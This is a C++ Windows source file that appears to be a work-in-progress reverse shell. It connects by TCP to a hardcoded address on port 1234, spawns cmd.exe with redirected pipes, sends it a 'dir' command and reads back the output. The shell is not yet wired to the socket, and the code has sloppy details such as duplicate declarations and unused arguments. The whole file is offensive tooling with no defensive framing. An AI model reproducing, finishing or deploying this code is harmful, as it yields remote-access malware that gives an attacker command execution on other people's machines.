#include "stdafx.h"
#include <ws2tcpip.h>
#include <winsock2.h>
#include <stdio.h>
#include <iostream>
#pragma comment(lib, "ws2_32")
#define BUFSIZE 4096 

using namespace std;

WSADATA wsaData;
SOCKET theSocket;
STARTUPINFO theProcess;
PROCESS_INFORMATION info_proc;
struct sockaddr_in Winsocket_Structure;

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;
SECURITY_ATTRIBUTES saAttr;

DWORD dwRead, dwWritten;
CHAR chBuf[6] = "dir\n";
BOOL bSuccess = FALSE;

int main(int argc, char *argv[])
{
	int searchInput = 0;
	char *IP = "192.168.24.134";
	short port = 1234;

	cout << "initiating connection to " << argv[1] << " on port " << argv[2] << endl;
	cout << endl << endl;
	cout << "also ip is " << IP << " and port is " << port << endl;

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	theSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	
	Winsocket_Structure.sin_port = htons(port);
	Winsocket_Structure.sin_family = AF_INET;
	inet_pton(AF_INET, IP, &(Winsocket_Structure.sin_addr.s_addr));

	cout << endl << endl;

	if ((theSocket == INVALID_SOCKET)) {
		cout << "invalid socket configuration" << endl;
		WSACleanup();
		return 1;
	}
	
	if ((WSAConnect(theSocket, (SOCKADDR*)&Winsocket_Structure, sizeof(Winsocket_Structure), NULL, NULL, NULL, NULL) == SOCKET_ERROR))
	{
		cout << "connetion error: please check your parameters" << endl;
		WSACleanup();
		return 1;
	}
	else {
		cout << "connected" << endl;
		cout << "opening gate for commands" << endl;
		
		//set up security attributes
		saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
		saAttr.bInheritHandle = TRUE;
		saAttr.lpSecurityDescriptor = NULL;

		//create pipes for output and input
		if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
			cout << "error creating OUTPUT pipe" << endl;
			return 1;
		}
		else {
			cout << "SUCCESS creating OUTPUT pipe" << endl;
		}


		if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
			cout << "error creating INPUT pipe" << endl;
			return 1;
		}
		else {
			cout << "SUCCESS creating INPUT pipe" << endl;
		}

		LPTSTR szRun = TEXT("cmd.exe");

		ZeroMemory(&theProcess, sizeof(theProcess));
		theProcess.cb = sizeof(theProcess);
		theProcess.dwFlags = STARTF_USESTDHANDLES;
		ZeroMemory(&info_proc, sizeof(info_proc));

		TCHAR szDir[1024], szCmd[MAX_PATH + 1];
		GetCurrentDirectoryW(sizeof(szDir), szDir);
		wcscpy_s(szCmd, szRun);

		theProcess.hStdError = g_hChildStd_OUT_Wr;
		theProcess.hStdOutput = g_hChildStd_OUT_Wr;
		theProcess.hStdInput = g_hChildStd_IN_Rd;

		if (CreateProcess(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, szDir, &theProcess, &info_proc) == 0) {
			cout << "problem creating the process" << endl;
		}
		else {
			cout << "the process has been created" << endl;
			
			bool status = WriteFile(g_hChildStd_IN_Wr, chBuf, sizeof(chBuf), &dwWritten, NULL);

			if (!status) {
				cout << "failure to write file x.x.x.x.x.x." << endl;
				return 1;
			}

			if (!CloseHandle(g_hChildStd_IN_Wr)) { cout << "Problem closing handle" << endl; }

			printf("\n->Contents of %s written to child STDIN pipe.\n", argv[1]);

			cout << "NOW....getting output" << endl;

			DWORD dwRead, dwWritten;
			CHAR chBuf[BUFSIZE];
			BOOL bSuccess = TRUE;
			HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

			for (;;)
			{
				cout << "Result of bSuc " << bSuccess << endl;

				bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
 
				cout << "Result of bSuc " << bSuccess << endl;
				if (!bSuccess || dwRead == 0) {
					cout << "Error reading stream" << endl;
				}
				else {
					cout << "BUFFER: " << chBuf << endl;
				}

				//bSuccess = WriteFile(hParentStdOut, chBuf,
				//	dwRead, &dwWritten, NULL);

				if (!bSuccess) break;
			}

		}
	}

	cin >> searchInput;
	return 0;
}